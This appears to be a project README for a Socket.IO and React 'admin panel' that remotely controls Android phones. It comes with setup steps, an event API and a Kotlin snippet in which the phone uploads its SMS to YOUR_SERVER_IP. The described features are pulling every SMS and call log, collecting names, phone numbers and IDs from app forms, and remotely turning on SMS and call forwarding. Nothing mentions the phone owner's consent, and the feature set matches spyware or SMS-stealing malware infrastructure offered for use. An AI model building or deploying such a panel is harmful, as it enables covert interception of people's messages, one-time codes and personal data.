# 📱 Smartphone Control Admin Panel

A modern web-based admin panel for remotely monitoring and controlling Android devices via Socket.IO.

## Features

- **📊 Device Dashboard** - View all connected devices with real-time online/offline status
- **💬 SMS Viewer** - View all SMS messages from connected devices
- **📞 Call Logs** - View incoming, outgoing, and missed call logs
- **📝 Form Data** - View data submitted from Android app forms
- **⚙️ Forwarding** - Configure SMS and call forwarding to another number
- **🔄 Real-time Updates** - All data syncs instantly via Socket.IO

## Tech Stack

| Layer | Technology |
|-------|------------|
| Backend | Node.js + Express + TypeScript |
| Real-time | Socket.IO |
| Frontend | React + Vite + TypeScript |
| Styling | Modern CSS (dark glassmorphism theme) |

## Project Structure

```
Web-App/
├── server/                 # Backend server
│   ├── src/
│   │   ├── index.ts       # Express server entry point
│   │   ├── store.ts       # In-memory data store
│   │   ├── types/         # TypeScript interfaces
│   │   └── socket/        # Socket.IO event handlers
│   └── package.json
│
└── client/                 # React frontend
    ├── src/
    │   ├── App.tsx        # Main app with routing
    │   ├── main.tsx       # Entry point
    │   ├── contexts/      # Socket & Device contexts
    │   ├── pages/         # Dashboard & DeviceDetail
    │   ├── types/         # TypeScript interfaces
    │   └── styles/        # CSS design system
    └── package.json
```

## Quick Start

### 1. Install Dependencies

```bash
# Install backend dependencies
cd Web-App/server
npm install

# Install frontend dependencies
cd ../client
npm install
```

### 2. Start the Servers

**Terminal 1 - Backend Server:**
```bash
cd Web-App/server
npm run dev
```
The backend will start on `http://localhost:3001`

**Terminal 2 - Frontend:**
```bash
cd Web-App/client
npm run dev
```
The frontend will start on `http://localhost:5173`

### 3. Open the Admin Panel

Open your browser and navigate to: **http://localhost:5173**

## Socket.IO API (For Android App Integration)

### Device → Server Events

| Event | Payload | Description |
|-------|---------|-------------|
| `device:register` | `{ id, name, phoneNumber }` | Register device on connect |
| `sms:sync` | `{ deviceId, sms: SMS[] }` | Sync SMS messages |
| `calls:sync` | `{ deviceId, calls: CallLog[] }` | Sync call logs |
| `form:submit` | `{ deviceId, name, phoneNumber, id }` | Submit form data |

### Server → Device Events

| Event | Payload | Description |
|-------|---------|-------------|
| `forwarding:config` | `{ smsEnabled, smsForwardTo, callsEnabled, callsForwardTo }` | Forwarding config update |

### Data Types

```typescript
interface SMS {
  id: string;
  sender: string;
  receiver: string;
  message: string;
  timestamp: string;
  type: 'incoming' | 'outgoing';
}

interface CallLog {
  id: string;
  number: string;
  type: 'incoming' | 'outgoing' | 'missed';
  duration: number; // seconds
  timestamp: string;
}
```

## Android App Integration Example

```kotlin
// Connect to server
val socket = IO.socket("http://YOUR_SERVER_IP:3001")
socket.connect()

// Register device
socket.emit("device:register", JSONObject().apply {
    put("id", deviceId)
    put("name", deviceName)
    put("phoneNumber", phoneNumber)
})

// Sync SMS
socket.emit("sms:sync", JSONObject().apply {
    put("deviceId", deviceId)
    put("sms", smsJsonArray)
})

// Listen for forwarding config
socket.on("forwarding:config") { args ->
    val config = args[0] as JSONObject
    // Handle forwarding configuration
}
```

## License

MIT
